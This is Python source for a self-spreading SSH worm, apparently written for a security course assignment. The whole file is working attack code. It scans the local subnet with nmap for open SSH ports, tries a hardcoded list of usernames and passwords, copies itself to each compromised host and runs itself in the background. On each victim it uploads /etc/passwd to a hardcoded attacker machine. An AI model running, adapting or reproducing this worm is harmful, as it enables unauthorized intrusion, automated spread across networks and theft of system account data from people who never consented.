import paramiko
import sys
import socket
import nmap
import os
import sys
import netifaces
import fcntl
import struct
from subprocess import call

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu', '123456')
]

# Attackers IP
Attackers_IP = "192.168.1.4"

# The file marking whether the worm should spread
Infected_Marker_File = "/home/ubuntu/ptinfected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	
	# Returns true if file exists or false if it doesn't exist
	return os.path.exists(Infected_Marker_File)	 

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	
	# Create ptinfected.txt file
	markerFile = open(Infected_Marker_File,"w")

	# Write to file
	markerFile.write("Have a wormful day! :) ")

	# Close file
	markerFile.close()


###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	
	# Check if system has been infected & print result
	infected = isInfectedSystem()
	print "The infection is: " , infected
	
	# Create an instance of the SFTP class that is used for uploading/downloading
	# files and executing commands
	sftpClient = sshClient.open_sftp()

	# Copy your self to the remote system (i.e. the other VM). 
	# We are assuming the
	# password has already been cracked. The worm is placed in the /tmp
	# directory on the remote system.
	sftpClient.put("passwordthief_worm.py", "/home/ubuntu/passwordthief_worm.py")

	# Make the worm file exeutable on the remote system
	sshClient.exec_command("chmod a+x /home/ubuntu/passwordthief_worm.py")

	# Execute the worm!
	# nohup - keep the worm running after we disconnect.
	# python - the python interpreter
	# & - run the whole commnad in the background
	sshClient.exec_command("nohup python /home/ubuntu/passwordthief_worm.py 2> error.txt > output.txt &")
	

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, userPassword, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

	status = 0
	# Attempting to connect to remote host
	try:
		print "Atacking host: " + host + "...",
		sshClient.connect(host, username = userName, password = userPassword)
		print "Success!"
	# Exceptions
	except socket.error:
		# System is down
		status = 3
		print "The system seems to be no longer up!"
	except paramiko.ssh_exception.AuthenticationException:
		# Wrong credentials are used
		status = 1
		print "Wrong credentials!"
	return status

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	sshClient = paramiko.SSHClient()

	# Set some parameters to make things easier.
	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	status = 0

	# The results of an attempt
	connection = None
				
	# Go through the credentials
	for (userName, userPassword) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		

		print "Trying: ", (userName,userPassword)
		
		# Trying out credentials in credList
		status = tryCredentials(host,userName,userPassword,sshClient)
		print "Status: ", status
		if status == 0 :
			connection = sshClient
			break
		elif status == 3 :
			connection = None
			break
	return connection


####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP():
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	return liveHosts

##################################################################
# Copy /etc/psswd file from the victims's system. It sends the file 
# back to the attacker's system. When the /etc/passwd file is copied
# to the attacker's system, it will be renamed to psswd<IP of the victim>
##################################################################

def StealingPassword():
	
	# Create an instance of the SSH client
	sshClient = paramiko.SSHClient()

	# Set some parameters to make things easier.
	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	#sshClient.open_sftp()

	transport = paramiko.Transport(("192.168.1.4",22))
	transport.connect(username = "ubuntu", password = "123456")
	sftp = paramiko.SFTPClient.from_transport(transport)

	try:
		# Move passwd to attacker's IP
		sftp.put("/etc/passwd", "/home/ubuntu/passwd" + getMyIP())
	except IOError:	
		print "Could not find the file /etc/passwd on the system"	

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 

if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if not isInfectedSystem():
		print "This system had not yet been infected!"
		markInfected()
		StealingPassword()
	else:
		print "Aborted the launch. This system is already infected!"
		exit(1)

# TODO: Get the IP of the current system
HostIP = getMyIP()

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).

networkHosts.remove(Attackers_IP)
print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	# Try to attack this host
	sshInfo =  attackSystem(host)
	print "Here is what I got: ", sshInfo
	
	
	# Did the attack succeed?
	if sshInfo:
		
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system

		try:
			print "Trying to spread!"
			remotepath = Infected_Marker_File
			localpath = "/home/ubuntu/ptinfected.txt"
		
			# Copy the file from the specified remote path 
			# to the specified local path. If the file does 
			# exist at the remote path, then get()
			# will throw IOError exception
			# (that is, we know the system is not yet infected).

			sftpClient = sshInfo.open_sftp()
			sftpClient.stat(remotepath)
			print "The system has been already infected, skipping it."
		except IOError:
			print "This system is not infected or the original host, attack it!"
			spreadAndExecute(sshInfo)
			print "Spreading complete"
			exit(1)
		print "No targets foun, worm signing off..."
sys.exit(0)	
	

